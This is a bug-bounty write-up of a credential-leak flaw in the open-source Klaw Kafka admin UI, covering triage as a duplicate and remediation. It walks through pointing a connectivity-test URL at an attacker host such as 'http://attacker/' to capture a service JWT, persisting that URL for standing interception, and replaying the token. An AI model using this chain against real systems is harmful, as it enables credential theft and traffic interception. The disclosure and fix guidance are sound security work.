# Case Study 9 — Credential Leakage & Persistent MITM (Cluster-API JWT)

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 3.1 **8.1**) as analysed — triaged **P5 / Informational** |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) / CWE-200 · transport: CWE-918 |
| **OWASP** | A07:2021 + A10:2021 (SSRF as mechanism only) |
| **VRT** | Sensitive Data Exposure → Disclosure of Secrets (primary); Server Security Misconfig (persist) |
| **Surface** | Open-source Kafka/cluster admin UI (Aiven-Open/klaw) |
| **Status** | Submitted Bugcrowd 2026-09-22 — `88090fa6-40f0-49b8-a9f3-6e159d7bed4d` · closed **2026-09-29** as **Duplicate** (Informational, P5) of a 2026-01-28 report covering the same endpoint |

---

## Problem

An authenticated **admin “test cluster API connectivity”** flow let the caller set an arbitrary base URL. The backend issued a **server-side HTTP request** with a freshly minted **cluster-API bearer JWT** attached — no URL allowlist, no redirect policy, no egress control.

1. **Token exfiltration** — attacker URL receives `Authorization: Bearer …` (HS256, TTL 180s)
2. **Out-of-band proof** — Burp Collaborator logged DNS + HTTP from the lab core
3. **Standing redirect** — a successful probe **persisted** the attacker URL into core config
4. **Replay** — same shared secret accepts the bearer on the cluster-api surface

**Impact:** credential leaves the trust boundary + config write enables ongoing MITM.

## Attack Chain

```
┌──────────────────────┐     ┌─────────────────────────┐     ┌──────────────────────┐
│ superadmin session   │────▶│ GET /testClusterApi     │────▶│ Server builds URI:   │
│ (UPDATE_SERVERCONFIG)│     │ Connection?clusterApi…  │     │ clusterApiUrl +      │
└──────────────────────┘     │ = http://attacker/      │     │ /topics/getApiStatus│
                             └─────────────────────────┘     └──────────┬───────────┘
                                                                       │
                              ┌────────────────────────────────────────┤
                              ▼                                        ▼
                    ┌─────────────────────┐               ┌─────────────────────────┐
                    │ Attacker listener   │               │ If response = ONLINE   │
                    │ receives GET +      │               │ persist klaw.clusterapi │
                    │ Bearer JWT          │               │.url = attacker URL      │
                    └──────────┬──────────┘               │ (standing MITM)         │
                               │                          └─────────────────────────┘
                               ▼
                    ┌─────────────────────┐
                    │ Replay JWT to       │
                    │ cluster-api :9343   │
                    │ → 200 "ONLINE"      │
                    └─────────────────────┘
```

## Approach

### Step 1 — Source-anchored sink
- Controller: `ServerConfigController` → `@PermissionAllowed(UPDATE_SERVERCONFIG)`
- Service: `ServerConfigService.testConnection` uses caller-controlled `clusterApiUrl`
- Sink: `ClusterApiService` builds `uri = clusterApiUrl + URI_CLUSTER_API` (`/topics/getApiStatus`)
- Credential attach: `Authorization: Bearer` from in-process HS256 mint (`generateToken`, TTL 180s)
- **No** scheme/host allowlist on that path

### Step 2 — Localhost PoC (exfil proof)
Fired `clusterApiUrl=http://127.0.0.1:9999` → HTTP 200 from core. Listener captured:

- Path: `/topics/getApiStatus`
- `Authorization: Bearer eyJ…`
- `User-Agent: klaw-core`

JWT header/payload decoded (alg HS256, `sub` = service account, `exp-iat = 180`).

### Step 3 — OOB (non-localhost)
Same request against Burp Collaborator hostname → core logged `text/html` response path. Collaborator UI: **7× DNS + HTTP interaction** with full request + bearer (screenshot in evidence pack).

### Step 4 — Persistence (“scope-changing” half of severity)
Responder returned `"ONLINE"` → core response `connectionStatus: success` → server log:

`updateKwCustomProperty … kwKey='klaw.clusterapi.url', kwValue='http://127.0.0.1:9998'`

Attacker URL is now the **stored** cluster-api base — subsequent core→cluster-api traffic can be redirected without re-triggering the test.

### Step 5 — JWT replay
Built cluster-api on `:9343` with the same shared secret:

| Request | Result |
|---------|--------|
| No token | **403** |
| Garbage bearer | **403** |
| Valid HS256 bearer (TTL 180s) | **200** `"ONLINE"` |

Any unexpired token signed with the shared secret authenticates. Validation is signature + exp only (no iss/aud/role).

### Step 6 — Validation
4-expert self-review → **STANDS**. Distinct from `bootstrapServers` path finding: different module, **credential attach + persist**.

## Results

- **High** credential-bearing server request + **standing MITM** (CVSS 8.1 as analysed)
- OOB network proof + JWT decode + config overwrite + cluster-api replay
- Evidence pack: council verdict (incl. VRT lock), raw logs, 7 ordered screenshots, md5-matched vulnerable sources, listener scripts
- Preconditions: authenticated `UPDATE_SERVERCONFIG`, non-blank cluster-api shared secret
- Full technical report + artifacts held for **program submission** (Aiven-Open OSS P1)

## Triage Response & Recommendation

**Outcome:** closed **2026-09-29** as **Duplicate**, state *Informational*, P5, VRT
*Server Security Misconfiguration → SSRF → External - Low impact* — against a report filed
**2026-01-28** covering credential exfil through the very same endpoint.

**Why I accepted it rather than contesting it:** the master predates this submission by seven
months and covers the identical entry point and impact class. My own pre-submission notes had
already flagged this endpoint as burned — *"any framing, including a CSRF-only reframe of the
same endpoint, is high duplicate risk."* I filed anyway to test whether the persistence and
no-credential halves were separable. Triage said no, and on the evidence they were right.

**The part I'd keep:** a second pass after closure established the endpoint fires on a
**cookie-only cross-site GET with no CSRF token** — a real browser, a logged-in session and
nothing else exfiltrate the credential, three distinct `jti` across three captures. That chain
is stronger than what was originally filed, and it is exactly the kind of material that becomes
a *new* report only when the underlying endpoint is genuinely different.

**Reporter takeaway:** a duplicate verdict against a same-endpoint master is not a judgement on
your work — the report was reproducible and triage said so. It is a scope question that should
have been settled before filing. Read the known-issues panel for the target's open report
titles *first*; seven months of prior art on one endpoint was knowable in advance.

---

## Remediation Delivered

- Allowlist cluster-api base URLs (scheme + host); block link-local/metadata/private ranges by policy
- Do not attach service JWTs to caller-controlled origins; call only configured cluster-api
- Refuse redirect/persist when test URL ≠ last known-good (or require explicit confirm)
- Shorten TTL / bind JWT to intended audience; audit shared-secret handling

## Tooling

Source graph review, local core + cluster-api lab, Python listeners, Collaborator OOB, HS256 sign/verify helper — AI-assisted generation; I drove the chain and kept claims inside demonstrated impact.

---

*Sanitized: secrets, Collaborator host, and live passwords redacted. Evidence package and full Bugcrowd report on request under program terms. Submit to triage before public exploit detail expansion.*
